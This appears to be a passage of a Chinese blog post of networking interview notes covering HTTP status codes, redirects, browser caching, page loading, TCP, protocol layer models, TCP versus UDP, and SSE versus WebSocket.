<h3 id="x3D-x3D-2、http状态码及含义-x3D-x3D"><a href="#x3D-x3D-2、http状态码及含义-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;2、http状态码及含义&#x3D;&#x3D;"></a>&#x3D;&#x3D;2、http状态码及含义&#x3D;&#x3D;</h3><p>HTTP状态码是指在客户端向服务器发送HTTP请求后，服务器返回的一个三位数字的代码，用于表示请求的处理结果。HTTP状态码的目的是让客户端能够理解服务器对请求的处理情况，以便采取适当的行动。以下是一些常见的HTTP状态码及其含义：</p>
<p>1xx（信息性状态码）：表示请求已经被接收，继续处理。</p>
<ul>
<li>100 Continue：服务器已经接收到请求的头部，并且客户端应继续发送请求的主体部分。</li>
</ul>
<p>2xx（成功状态码）：表示请求已经成功被接收、理解、接受。</p>
<ul>
<li>200 OK：请求已成功被处理。</li>
<li>201 Created：请求已成功并且服务器创建了新资源。</li>
<li>204 No Content：请求成功，但响应中不包含实体的主体部分。</li>
</ul>
<p>3xx（重定向状态码）：表示需要客户端采取进一步的操作才能完成请求。</p>
<ul>
<li>301 Moved Permanently：资源被永久移动到新的URI，客户端需要使用新的URI重新发起请求。</li>
<li>302 Found：资源被临时移动到新的URI，客户端需要使用新的URI重新发起请求。</li>
<li>304 Not Modified：客户端发送了一个条件性的请求，服务器返回资源未被修改。</li>
</ul>
<p>4xx（客户端错误状态码）：表示客户端发送的请求有误。</p>
<ul>
<li>400 Bad Request：请求无效，服务器无法理解请求的语法。</li>
<li>401 Unauthorized：请求要求身份验证。</li>
<li>403 Forbidden：服务器拒绝执行请求。</li>
<li>404 Not Found：服务器未找到请求的资源。</li>
</ul>
<p>5xx（服务器错误状态码）：表示服务器在处理请求的过程中发生了错误。</p>
<ul>
<li>500 Internal Server Error：服务器遇到了意外错误，无法完成请求。</li>
<li>502 Bad Gateway：服务器作为网关或代理，从上游服务器接收到无效的响应。</li>
<li>503 Service Unavailable：服务器当前无法处理请求，通常是因为过载或维护。</li>
</ul>
<p>这些状态码是HTTP协议中的一部分，它们用于在客户端和服务器之间传递关于请求处理的信息。通过查看响应的状态码，可以更好地了解请求的结果，并采取相应的措施，例如重新请求、跳转到新的URL或显示错误信息。</p>
<h5 id="说一说出现302状态和出现301状态的场景"><a href="#说一说出现302状态和出现301状态的场景" class="headerlink" title="说一说出现302状态和出现301状态的场景"></a>说一说出现302状态和出现301状态的场景</h5><p>HTTP 状态码 301 和 302 都表示重定向（Redirection），但它们的应用场景和行为略有不同：</p>
<ol>
<li><p><strong>301 Moved Permanently（永久重定向）</strong>：</p>
<ul>
<li>当服务器返回 HTTP 状态码 301 时，表示被请求的资源已经永久移动到了一个新的 URL。</li>
<li>浏览器会缓存这个重定向，将来的请求都会直接发送到新的 URL。</li>
<li>301 通常用于告诉搜索引擎和浏览器，该资源的 URL 已永久更改，应将之前的 URL 替换为新的 URL。</li>
<li>301 重定向通常用于实现网站的 URL 重构或更改，以及更改网站的域名。</li>
</ul>
</li>
<li><p><strong>302 Found（临时重定向）</strong>：</p>
<ul>
<li>当服务器返回 HTTP 状态码 302 时，表示被请求的资源已经临时移动到了一个新的 URL。</li>
<li>浏览器会在每次请求时都跟随这个重定向，不会缓存新的 URL。</li>
<li>302 通常用于临时性的重定向，告诉浏览器和搜索引擎，该资源的 URL 已临时更改，但未来可能会还原。</li>
<li>302 重定向用于处理临时性的情况，例如服务器维护、临时性的页面跳转等。</li>
</ul>
</li>
</ol>
<p>在实际应用中，301 和 302 重定向可以用于不同的场景：</p>
<ul>
<li><p>使用 301 重定向时，浏览器会将旧 URL 缓存起来，并将请求重定向到新 URL，搜索引擎也会更新索引。这通常用于处理永久性的 URL 更改，以确保旧链接不会失效。</p>
</li>
<li><p>使用 302 重定向时，浏览器不会缓存新 URL，每次都会重新请求。这通常用于处理临时性的页面跳转，例如登录后返回原页面。</p>
</li>
</ul>
<p><strong>HTTP 301 Moved Permanently（永久重定向）</strong>：</p>
<ol>
<li><strong>网站 URL 重构</strong>：当网站进行结构性变化或更改 URL 路由时，可以使用 301 重定向来告诉搜索引擎和浏览器，该资源已永久移动到新的 URL。这有助于搜索引擎更新索引并保持用户链接的有效性。</li>
<li><strong>更改域名</strong>：当网站更改域名时，可以使用 301 重定向来通知用户和搜索引擎，将来自旧域名的请求重定向到新域名。这有助于维护搜索引擎排名和用户体验。</li>
<li><strong>HTTP 到 HTTPS 的迁移</strong>：当网站从不安全的 HTTP 迁移到安全的 HTTPS 协议时，可以使用 301 重定向来强制所有访问 HTTP 版本的页面跳转到 HTTPS 版本。</li>
</ol>
<p><strong>HTTP 302 Found（临时重定向）</strong>：</p>
<ol>
<li><strong>登录后跳转</strong>：在网站上，当用户登录后，通常会将他们重定向到之前访问的页面或某个默认页面，这时可以使用 302 临时重定向。</li>
<li><strong>A&#x2F;B 测试</strong>：在进行 A&#x2F;B 测试时，可以使用 302 重定向来测试不同版本的页面。用户会被随机重定向到不同版本，以便收集数据和评估性能。</li>
<li><strong>临时性跳转</strong>：一些情况下，需要对某些页面进行临时性跳转，但不希望浏览器缓存重定向的结果。此时可以使用 302 临时重定向。</li>
</ol>
<p>需要注意的是，虽然上述场景是 301 和 302 最常见的用法，但具体的使用情况可能因应用程序和业务需求而有所不同。选择正确的重定向状态码很重要，因为它们会影响搜索引擎排名、用户体验和缓存行为。</p>
<h3 id="x3D-x3D-3、http缓存-x3D-x3D"><a href="#x3D-x3D-3、http缓存-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;3、http缓存&#x3D;&#x3D;"></a>&#x3D;&#x3D;3、http缓存&#x3D;&#x3D;</h3><p>所谓浏览器缓存其实就是指在本地使用的计算机中开辟一个内存区，同时也开辟一个硬盘区作为数据传输的缓冲区，然后用这个缓冲区来暂时保存用户以前访问过的信息。</p>
<p>HTTP 缓存主要是通过请求和响应报文头中的对应 Header 信息，来控制缓存的策略。</p>
<p>HTTP缓存可以缩短网页请求资源的距离，减少延迟，节省网络流量，并且由于缓存文件可以重复利用，降低网络负荷，提高客户端响应。</p>
<p>根据是否需要重新向服务器发起请求，可分为<strong>强缓存和协商缓存</strong></p>
<h5 id="强缓存"><a href="#强缓存" class="headerlink" title="强缓存"></a>强缓存</h5><p>定义：当命中强缓存的时候，客户端不会再请求服务器，直接从缓存中读取内容，并返回HTTP状态码200。</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/baac76ed978c4218816daf2dfaea2f4d~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="img"></p>
<p>强制缓存，在响应头由 Expires、Cache-Control 和 Pragma控制</p>
<ul>
<li>Expires：值为服务器返回的过期时间，浏览器再次加载资源时，如果在这个过期时间内，则命中强缓存。（HTTP1.0的属性，缺点是客户端和服务器时间不一致会导致命中误差）</li>
<li>Cache-Control：HTTP1.1属性，优先级更高，以下为常用属性<ul>
<li>no-store： 禁用缓存</li>
<li>no-cache：不使用强缓存，每次需向服务器验证缓存是否失效</li>
<li>private&#x2F;public：private指的单个用户，public可以被任何中间人、CDN等缓存</li>
<li>max-age&#x3D;：max-age是距离请求发起的时间的秒数</li>
<li>must-revalidate：在缓存过期前可以使用，过期后必须向服务器验证</li>
</ul>
</li>
<li>Pragma<ul>
<li>no-cache：效果和cache-control等no-cache一致。 优先级Pragma &gt; Cache-Control &gt; Expires</li>
</ul>
</li>
</ul>
<p>强缓存的资源存储位置</p>
<table>
<thead>
<tr>
<th>状态</th>
<th>Network - Size</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>200</td>
<td>from memory cache</td>
<td>不请求网络资源，资源在内存， 一般是脚本、字体、图片，浏览器关闭，数据将被释放</td>
</tr>
<tr>
<td>200</td>
<td>from disk cache</td>
<td>请求网络资源，资源在磁盘， 一般是css等，关闭数据还在</td>
</tr>
<tr>
<td>200</td>
<td>资源大小</td>
<td>从服务器下载最新资源</td>
</tr>
<tr>
<td>304</td>
<td>报文大小</td>
<td>请求服务端发现资源未更新，使用本地资源</td>
</tr>
</tbody></table>
<h5 id="协商缓存"><a href="#协商缓存" class="headerlink" title="协商缓存"></a>协商缓存</h5><p>定义：向服务器发送请求，服务器会根据这个请求的请求头的一些参数来判断是否命中协商缓存，如果命中，则返回304状态码并带上新的响应头通知浏览器从缓存中读取资源</p>
<p>协商缓存，响应头中有两个字段标记规则</p>
<ul>
<li><p>Last-Modified &#x2F; If-Modified-Since</p>
<ul>
<li>Last-Modified是浏览器第一个请求资源，服务器响应头字段，是资源文件<strong>最后一次更改时间(精确到秒)。</strong></li>
<li>下一次发送请求时，请求头里的<strong>If-Modified-Since</strong>就是之前的Last-Modified</li>
<li>服务器更加最后修改时间判断命中，如果命中，http为304且不返回资源、不返回last-modify</li>
</ul>
</li>
<li><p>Etag &#x2F; If-None-Match：</p>
<p>Etag 的校验优先级高于 Last-Modified</p>
<ul>
<li>Etag是加载资源时，服务器返回的响应头字段，是对资源的唯一标记，值是hash码。</li>
<li>浏览器在下一次加载资源向服务器发送请求时，会将上一次返回的Etag值放到请求头里的<strong>If-None-Match</strong>里</li>
<li>服务器接受到If-None-Match的值后，会拿来跟该资源文件的Etag值<strong>做比较</strong>，如果相同，则表示资源文件没有发生改变，命中协商缓存。</li>
</ul>
</li>
</ul>
<blockquote>
<p>在精确度上，Etag要优于Last-Modified，Last-Modified的时间单位是秒，如果某个文件在1秒内改变了多次，那么他们的Last-Modified其实并没有体现出来修改，但是Etag每次都会改变确保了精度 在性能上，Etag要逊于Last-Modified，毕竟Last-Modified只需要记录时间，而Etag需要服务器通过算法来计算出一个hash值。 <strong>在优先级上，服务器校验优先考虑Etag。</strong></p>
</blockquote>
<p>用户行为对强缓存和协商缓存的影响</p>
<table>
<thead>
<tr>
<th>用户操作</th>
<th>Expires&#x2F;cache-control</th>
<th>Last-modified&#x2F;Etag</th>
</tr>
</thead>
<tbody><tr>
<td>地址栏回车 页面链接跳转 新开窗口 前进、后退</td>
<td>有效</td>
<td>有效</td>
</tr>
<tr>
<td>F5刷新</td>
<td>无效</td>
<td>有效</td>
</tr>
<tr>
<td>Ctrl + F5刷新（强制刷新）</td>
<td>无效</td>
<td>无效</td>
</tr>
</tbody></table>
<h5 id="启发式缓存"><a href="#启发式缓存" class="headerlink" title="启发式缓存"></a>启发式缓存</h5><blockquote>
<p>MDN解释: 对于含有特定头信息的请求，会去计算缓存寿命。比如<code>Cache-control: max-age=N</code>的头，相应的缓存的寿命就是<code>N</code>。通常情况下，对于不含这个属性的请求则会去查看是否包含<a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Expires">Expires</a>属性，通过比较Expires的值和头里面<a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Date">Date</a>属性的值来判断是否缓存还有效。如果max-age和expires属性都没有，找找头里的<a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Last-Modified">Last-Modified</a>信息。如果有，缓存的寿命就等于头里面Date的值减去Last-Modified的值除以10（注：根据rfc2626其实也就是乘以10%）</p>
</blockquote>
<p>简而言之，只有在没有明确缓存策略时，会激活启发式缓存。所以要合理设置缓存，否则会因没有设置缓存时间等原因，导致内容缓存不刷新。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// Date 减去 Last-Modified 值的 10% 作为缓存时间。</span><br><span class="hljs-comment">// Date：创建报文的日期时间, Last-Modified 服务器声明文档最后被修改时间</span><br>  response_is_fresh = (<span class="hljs-title class_">Date</span> -  <span class="hljs-title class_">Last</span>-<span class="hljs-title class_">Modified</span>) % <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure>

<hr>
<h5 id="附："><a href="#附：" class="headerlink" title="附："></a>附：</h5><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/4f03d57d77d74f15bb47bf3aa4c865f8~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="img"></p>
<h5 id="一、设置不缓存的方法"><a href="#一、设置不缓存的方法" class="headerlink" title="一、设置不缓存的方法"></a>一、设置不缓存的方法</h5><ol>
<li>html文件设置meta；</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;meta http-equiv=<span class="hljs-string">&quot;pragma&quot;</span> content=<span class="hljs-string">&quot;no-cache&quot;</span>&gt; <br>&lt;meta http-equiv=&quot;Cache-Control&quot; content=&quot;no-cache, must-revalidate&quot;&gt; <br>&lt;meta http-equiv=&quot;expires&quot; content=&quot;Wed, 26 Feb 1997 00:00:00 GMT&quot;&gt;<br></code></pre></td></tr></table></figure>

<ol>
<li>服务端响应添加<code>Cache-Control:no-cache,must-revalidate</code>指令；</li>
<li>修改请求头<code>If-modified-since:0</code>或<code>If-none-match</code>；</li>
<li>请求url后增加时间戳；</li>
<li>服务端设置Cache-Control:private指令，防止代理服务器缓存资源</li>
</ol>
<h5 id="二、-为什么同一个资源有时是from-memory-cache有时是from-disk-cache？"><a href="#二、-为什么同一个资源有时是from-memory-cache有时是from-disk-cache？" class="headerlink" title="二、 为什么同一个资源有时是from memory cache有时是from disk cache？"></a><strong>二、 为什么同一个资源有时是from memory cache有时是from disk cache？</strong></h5><p>Chrome会根据本地内存的使用率来决定缓存存放在哪，如果内存使用率很高，放在磁盘里面，内存的使用率很高会暂时放在内存里面</p>
<h5 id="三、Cache-Control-max-age-x3D-0-和-no-cache有什么不同？"><a href="#三、Cache-Control-max-age-x3D-0-和-no-cache有什么不同？" class="headerlink" title="三、Cache-Control: max-age&#x3D;0 和 no-cache有什么不同？"></a>三、<strong>Cache-Control: max-age&#x3D;0 和 no-cache有什么不同？</strong></h5><p><code>max-age=0</code>和<code>no-cache</code>应该是从语气上不同。<code>max-age=0</code>是告诉客户端资源的缓存到期<strong>应该</strong>向服务器验证缓存的有效性。而<code>no-cache</code>则告诉客户端使用缓存前<strong>必须</strong>向服务器验证缓存的有效性。</p>
<h5 id="缓存在http各个版本的应用"><a href="#缓存在http各个版本的应用" class="headerlink" title="缓存在http各个版本的应用"></a>缓存在http各个版本的应用</h5><p>HTTP 协议的不同版本（包括 HTTP&#x2F;1.0、HTTP&#x2F;1.1、HTTP&#x2F;2 和 HTTP&#x2F;3）都支持缓存，但它们在缓存的作用和机制上有一些不同。以下是各个版本的 HTTP 缓存作用和机制的简要概述：</p>
<h5 id="HTTP-x2F-1-0"><a href="#HTTP-x2F-1-0" class="headerlink" title="HTTP&#x2F;1.0:"></a>HTTP&#x2F;1.0:</h5><ol>
<li><p><strong>Expires 头字段：</strong> HTTP&#x2F;1.0 使用 <code>Expires</code> 头字段来指定响应的过期时间。浏览器在接收到响应后，将会将其缓存，并在过期时间内直接使用缓存，而不必再次请求服务器。</p>
</li>
<li><p><strong>Last-Modified 和 If-Modified-Since 头字段：</strong> 如果服务器响应包含 <code>Last-Modified</code> 头字段，浏览器将在下一次请求时发送 <code>If-Modified-Since</code> 头字段，询问服务器资源是否在上次修改后发生了变化。如果服务器返回状态码 304（未修改），浏览器将使用缓存。</p>
</li>
</ol>
<h5 id="HTTP-x2F-1-1"><a href="#HTTP-x2F-1-1" class="headerlink" title="HTTP&#x2F;1.1:"></a>HTTP&#x2F;1.1:</h5><ol>
<li><p><strong>Cache-Control 头字段：</strong> HTTP&#x2F;1.1 引入了更强大的缓存控制机制，通过 <code>Cache-Control</code> 头字段可以指定缓存策略，例如 <code>max-age</code> 表示缓存的最大有效时间。这允许更灵活地控制缓存。</p>
</li>
<li><p><strong>ETag 和 If-None-Match 头字段：</strong> 服务器可以为资源生成唯一的 <code>ETag</code>（实体标签），浏览器在下一次请求时将发送 <code>If-None-Match</code> 头字段，询问服务器资源是否发生了变化。如果服务器返回状态码 304，浏览器将使用缓存。</p>
</li>
</ol>
<h5 id="HTTP-x2F-2"><a href="#HTTP-x2F-2" class="headerlink" title="HTTP&#x2F;2:"></a>HTTP&#x2F;2:</h5><p>HTTP&#x2F;2 使用了与 HTTP&#x2F;1.1 相似的缓存机制，但由于其多路复用特性，多个请求可以通过单个连接并行发送和接收，因此它可以更有效地利用缓存。</p>
<h5 id="HTTP-x2F-3"><a href="#HTTP-x2F-3" class="headerlink" title="HTTP&#x2F;3:"></a>HTTP&#x2F;3:</h5><p>HTTP&#x2F;3 是基于 QUIC 协议的，与 HTTP&#x2F;2 类似，它也支持多路复用。HTTP&#x2F;3 引入了一些性能优化，但在缓存机制方面与 HTTP&#x2F;2 类似。</p>
<p>总体来说，不同版本的 HTTP 协议都支持缓存，但 HTTP&#x2F;1.1 引入了更多的缓存控制选项，使缓存更加灵活。而 HTTP&#x2F;2 和 HTTP&#x2F;3 在多路复用方面具有优势，可以更有效地利用缓存来提高性能。缓存是提高 Web 性能的关键因素之一，合理配置缓存策略可以减少不必要的网络请求，降低页面加载时间。</p>
<h3 id="x3D-x3D-4、从输入url到看到页面的过程-x3D-x3D"><a href="#x3D-x3D-4、从输入url到看到页面的过程-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;4、从输入url到看到页面的过程&#x3D;&#x3D;"></a>&#x3D;&#x3D;4、从输入url到看到页面的过程&#x3D;&#x3D;</h3><p>将 URL 转化为页面的过程涉及多个步骤，其中包括 DNS 解析、建立 TCP 连接、进行 HTTPS 安全握手、发送 HTTP 请求、接收响应、渲染页面等等。以下是详细的步骤：</p>
<ol>
<li><p><strong>DNS 解析（Domain Name System）：</strong></p>
<ul>
<li>当用户在浏览器中输入一个 URL，浏览器首先需要将域名部分解析为对应的 IP 地址。</li>
<li>浏览器首先检查本地 DNS 缓存，如果找到了对应的 IP 地址，就会直接使用它，否则继续下一步。</li>
<li>如果本地缓存中没有记录，浏览器会向本地 DNS 服务器发送 DNS 查询请求，以获取域名对应的 IP 地址。</li>
<li>如果本地 DNS 服务器也没有缓存，它会向更高级别的 DNS 服务器发起查询请求，直至找到域名的 IP 地址，然后将结果返回给浏览器。</li>
</ul>
</li>
<li><p><strong>建立 TCP 连接（Transmission Control Protocol）：</strong></p>
<ul>
<li>一旦浏览器获取到目标服务器的 IP 地址，它需要建立一个 TCP 连接以与服务器通信。</li>
<li>浏览器会创建一个 TCP 套接字，包括源 IP、源端口、目标 IP 和目标端口，然后发起三次握手（SYN、SYN-ACK、ACK）来建立连接。</li>
<li>一旦连接建立成功，浏览器和服务器之间可以进行双向通信。</li>
</ul>
</li>
<li><p><strong>进行 HTTPS 安全握手：</strong></p>
<ul>
<li>如果目标页面是通过 HTTPS 访问的，浏览器会在建立 TCP 连接后执行 TLS&#x2F;SSL 安全握手。</li>
<li>安全握手过程包括服务器证书验证、生成加密密钥、验证服务器身份等步骤，以确保通信的安全性和完整性。</li>
</ul>
</li>
<li><p><strong>发送 HTTP 请求：</strong></p>
<ul>
<li>一旦安全握手完成，浏览器会构建一个 HTTP 请求报文，包括请求方法（GET、POST 等）、请求头、请求体等。</li>
<li>请求报文被封装成 TCP 包，并通过 TCP 连接发送到服务器。</li>
</ul>
</li>
<li><p><strong>服务器处理请求：</strong></p>
<ul>
<li>服务器接收到 HTTP 请求后，会解析请求报文，并根据请求的路径和参数执行相应的操作。</li>
<li>服务器会处理请求，并生成一个 HTTP 响应报文，包括状态码、响应头、响应体等。</li>
</ul>
</li>
<li><p><strong>接收 HTTP 响应：</strong></p>
<ul>
<li>浏览器在接收到服务器的 HTTP 响应后，会解析响应报文。</li>
<li>如果响应状态码为 200（OK），浏览器会继续处理响应内容。否则，它会根据状态码执行相应的错误处理。</li>
</ul>
</li>
<li><p><strong>渲染页面：</strong></p>
<ul>
<li>如果响应内容是 HTML 页面，浏览器会开始解析 HTML，并构建 DOM（文档对象模型）树。</li>
<li>浏览器会下载页面所需的外部资源，如 CSS、JavaScript、图片等，并并行处理它们。</li>
<li>浏览器根据 DOM 树和 CSS 样式计算出页面的布局，然后将页面渲染到屏幕上。</li>
<li>JavaScript 代码可以修改 DOM 和样式，实现交互和动态效果。</li>
</ul>
</li>
<li><p><strong>执行 JavaScript：</strong></p>
<ul>
<li>如果页面包含 JavaScript，浏览器会执行 JavaScript 代码，处理事件、数据请求、页面交互等。</li>
<li>JavaScript 可以通过 DOM 操作修改页面内容，与服务器进行 AJAX 请求，以及处理用户输入等。</li>
</ul>
</li>
<li><p><strong>事件处理和用户交互：</strong></p>
<ul>
<li>浏览器会监听用户的交互事件，如点击、输入、滚动等。</li>
<li>当用户与页面交互时，浏览器会触发相应的事件处理函数，执行相应的操作。</li>
</ul>
</li>
</ol>
<p>以上是将 URL转化为页面的主要步骤。整个过程包括网络通信、安全性验证、资源下载、页面渲染、JavaScript 执行等多个环节，它们共同构成了在浏览器中访问网页的复杂过程。</p>
<h3 id="5、完整说说tcp过程"><a href="#5、完整说说tcp过程" class="headerlink" title="5、完整说说tcp过程"></a>5、完整说说tcp过程</h3><p>TCP（Transmission Control Protocol）是一种可靠的、面向连接的协议，用于在计算机之间传输数据。以下是 TCP 过程的简要概述：</p>
<ol>
<li><p><strong>建立连接（三次握手）：</strong></p>
<p>a. 客户端向服务器发送一个 SYN（同步）包，表示请求建立连接。</p>
<p>b. 服务器收到 SYN 包后，回复一个 SYN-ACK 包，表示确认请求，并准备好建立连接。</p>
<p>c. 客户端收到 SYN-ACK 包后，回复一个 ACK 包，表示连接已建立。</p>
<p>这个过程称为三次握手，它确保了客户端和服务器之间的双向通信通道已经建立。</p>
</li>
<li><p><strong>数据传输：</strong></p>
<p>一旦连接建立，客户端和服务器可以相互传输数据。数据被分成小的数据包，每个数据包都带有序列号，以确保数据的顺序和完整性。</p>
</li>
<li><p><strong>流量控制和拥塞控制：</strong></p>
<p>TCP 使用流量控制和拥塞控制来管理数据的传输。流量控制确保接收方能够处理发送方发送的数据，而拥塞控制通过监控网络拥塞情况并调整发送速率来避免网络过载。</p>
</li>
<li><p><strong>关闭连接（四次挥手）：</strong></p>
<p>a. 客户端向服务器发送一个 FIN（结束）包，表示客户端不再发送数据。</p>
<p>b. 服务器收到 FIN 包后，发送一个 ACK 包，确认接收到 FIN 包。</p>
<p>c. 服务器通知应用程序数据已传输完毕，应用程序关闭连接。</p>
<p>d. 服务器向客户端发送一个 FIN 包，表示服务器也不再发送数据。</p>
<p>e. 客户端收到 FIN 包后，发送一个 ACK 包，确认接收到 FIN 包。</p>
<p>f. 客户端通知应用程序数据已传输完毕，应用程序关闭连接。</p>
<p>这个过程称为四次挥手，它确保连接能够安全地关闭，双方都知道不再传输数据。</p>
</li>
</ol>
<p>TCP 过程是可靠的，确保了数据的可靠传输和顺序传递。它还包括错误检测和纠正机制，以处理数据包的丢失和损坏。这使得 TCP 成为互联网上最常用的传输协议之一，用于可靠地传输 Web 页面、电子邮件、文件传输等各种应用。</p>
<h3 id="6、计网7层协议，5层协议"><a href="#6、计网7层协议，5层协议" class="headerlink" title="6、计网7层协议，5层协议"></a>6、计网7层协议，5层协议</h3><p>计算机网络体系结构通常分为两种模型，一种是七层协议模型（OSI 模型），另一种是五层协议模型（TCP&#x2F;IP 模型）。下面分别介绍这两种模型：</p>
<p><strong>OSI 模型（七层协议模型）：</strong></p>
<ol>
<li><p><strong>物理层（Physical Layer）：</strong> 负责传输比特流，处理硬件层面的信号传输，如电压、电流、物理介质等。</p>
</li>
<li><p><strong>数据链路层（Data Link Layer）：</strong> 负责数据帧的传输和识别，提供物理层的数据传输可靠性，通常包括 MAC 地址（硬件地址）的管理。</p>
</li>
<li><p><strong>网络层（Network Layer）：</strong> 负责数据包的路由和转发，实现不同子网之间的通信，使用 IP 协议。</p>
</li>
<li><p><strong>传输层（Transport Layer）：</strong> 负责端到端的通信，提供端口号、数据包的分段和重组，常见协议有 TCP 和 UDP。</p>
</li>
<li><p><strong>会话层（Session Layer）：</strong> 管理会话的建立、维护和终止，提供数据传输的同步和检测。</p>
</li>
<li><p><strong>表示层（Presentation Layer）：</strong> 数据的格式化、加密、压缩和解压缩，确保数据能够被正确解释。</p>
</li>
<li><p><strong>应用层（Application Layer）：</strong> 提供应用程序与网络通信的接口，包括 HTTP、FTP、SMTP 等应用协议。</p>
</li>
</ol>
<p><strong>TCP&#x2F;IP 模型（五层协议模型）：</strong></p>
<ol>
<li><p><strong>物理层（Physical Layer）：</strong> 与 OSI 模型的物理层相同，负责硬件传输。</p>
</li>
<li><p><strong>数据链路层（Data Link Layer）：</strong> 与 OSI 模型的数据链路层和部分网络层功能相结合，包括网络接口卡、以太网、ARP（地址解析协议）等。</p>
</li>
<li><p><strong>网络层（Network Layer）：</strong> 与 OSI 模型的网络层相同，负责数据包的路由和转发，包括 IP 协议。</p>
</li>
<li><p><strong>传输层（Transport Layer）：</strong> 与 OSI 模型的传输层相同，负责端到端的通信，包括 TCP 和 UDP 协议。</p>
</li>
<li><p><strong>应用层（Application Layer）：</strong> 将 OSI 模型的会话层、表示层和应用层合并为一个应用层，负责提供应用程序与网络通信的接口，包括 HTTP、FTP、SMTP 等应用协议。</p>
</li>
</ol>
<p>需要注意的是，虽然 OSI 模型和 TCP&#x2F;IP 模型在层次结构上稍有不同，但它们都是用于描述计算机网络通信的模型，用于帮助理解和组织网络协议。实际上，在实际网络中，更常用的是 TCP&#x2F;IP 模型，因为它更符合互联网的实际工作方式。</p>
<h3 id="7、TCP和UDP的区别"><a href="#7、TCP和UDP的区别" class="headerlink" title="7、TCP和UDP的区别"></a>7、TCP和UDP的区别</h3><p>TCP（Transmission Control Protocol）和UDP（User Datagram Protocol）是两种不同的传输层协议，它们在数据传输时有一些重要的区别。以下是它们之间的主要区别：</p>
<ol>
<li><p><strong>连接性质：</strong></p>
<ul>
<li><strong>TCP：</strong> TCP是一种面向连接的协议。在数据传输之前，它需要建立一个连接，以确保数据可靠地传输。连接建立后，数据按顺序和可靠地传输，如果数据包丢失或损坏，TCP会重新传输。</li>
<li><strong>UDP：</strong> UDP是一种无连接的协议。它不需要在发送数据之前建立连接，也不保证数据的可靠性。UDP发送数据后，不会进行重新传输，因此数据包可能会丢失或到达顺序可能会变化。</li>
</ul>
</li>
<li><p><strong>可靠性：</strong></p>
<ul>
<li><strong>TCP：</strong> TCP提供可靠的数据传输。它使用序号、确认和超时等机制来确保数据的完整性和顺序，如果数据包丢失或损坏，TCP会重新传输它们，直到接收方确认接收。</li>
<li><strong>UDP：</strong> UDP不提供可靠性保证。它发送数据后不会等待确认，也不进行重新传输。这使得UDP更适合那些可以容忍一些数据丢失的应用，如实时音频和视频传输。</li>
</ul>
</li>
<li><p><strong>流量控制：</strong></p>
<ul>
<li><strong>TCP：</strong> TCP具有流量控制机制，它可以自动调整数据传输的速度，以适应网络的带宽和拥塞情况。这有助于避免过多的数据拥堵网络。</li>
<li><strong>UDP：</strong> UDP没有内置的流量控制机制，因此它可能会导致过多的数据包被发送到网络中，可能会引发拥塞。</li>
</ul>
</li>
<li><p><strong>数据包头部开销：</strong></p>
<ul>
<li><strong>TCP：</strong> TCP头部相对较大，包含许多控制信息，这增加了每个数据包的开销。</li>
<li><strong>UDP：</strong> UDP头部相对较小，只包含基本的源端口、目标端口、数据长度和校验和等信息，因此UDP数据包的开销较小。</li>
</ul>
</li>
<li><p><strong>适用场景：</strong></p>
<ul>
<li><strong>TCP：</strong> 适用于需要可靠性和有序性的应用，如网页浏览、电子邮件、文件传输等。</li>
<li><strong>UDP：</strong> 适用于实时性要求高、能够容忍一些数据丢失的应用，如音频&#x2F;视频流媒体、在线游戏、VoIP通信等。</li>
</ul>
</li>
</ol>
<p>总之，TCP和UDP是两种不同的传输层协议，它们适用于不同类型的应用场景。TCP提供可靠的、有序的数据传输，适合那些对数据完整性和可靠性要求高的应用。而UDP提供了更低的开销和更高的实时性，适合那些对传输延迟要求高的实时应用。选择使用哪种协议取决于应用程序的需求和性能要求。</p>
<h3 id="8、http2-0服务端给客户端推资源sse，这个特性和-websokit-有啥区别"><a href="#8、http2-0服务端给客户端推资源sse，这个特性和-websokit-有啥区别" class="headerlink" title="8、http2.0服务端给客户端推资源sse，这个特性和 websokit 有啥区别"></a>8、http2.0服务端给客户端推资源sse，这个特性和 websokit 有啥区别</h3><p>HTTP&#x2F;2.0服务器推送（Server Push）、Server-Sent Events (SSE) 和 WebSocket 都是用于实现实时通信的技术，但它们在用途和工作原理上有很大的区别。</p>
<ol>
<li><p><strong>HTTP&#x2F;2.0服务器推送：</strong></p>
<ul>
<li>HTTP&#x2F;2.0服务器推送是一种在客户端请求资源时，服务器可以主动将相关资源推送给客户端的技术。</li>
<li>它基于HTTP&#x2F;2协议，通过复用单一的TCP连接来提高性能。</li>
<li>服务器推送通常用于提前将与当前请求相关的资源（如CSS、JavaScript文件等）推送给客户端，以减少页面加载时间。</li>
<li>服务器推送是一种单向通信，只能从服务器向客户端推送数据，客户端不能向服务器发送消息。</li>
</ul>
</li>
<li><p><strong>Server-Sent Events (SSE)：</strong></p>
<ul>
<li>SSE 是一种浏览器向服务器发起的持久性单向通信技术，服务器可以在有新数据时推送数据给客户端。</li>
<li>SSE 基于标准的HTTP协议，使用EventSource API来建立连接和接收服务器推送的事件。</li>
<li>SSE 主要用于实现服务器向客户端的单向通信，例如实时通知、实时更新等场景。</li>
<li>SSE 是基于文本的，通常用于传输文本数据，不适用于传输二进制数据。</li>
</ul>
</li>
<li><p><strong>WebSocket：</strong></p>
<ul>
<li>WebSocket 是一种全双工的双向通信技术，它允许客户端和服务器之间建立持久性连接，双方可以随时发送消息。</li>
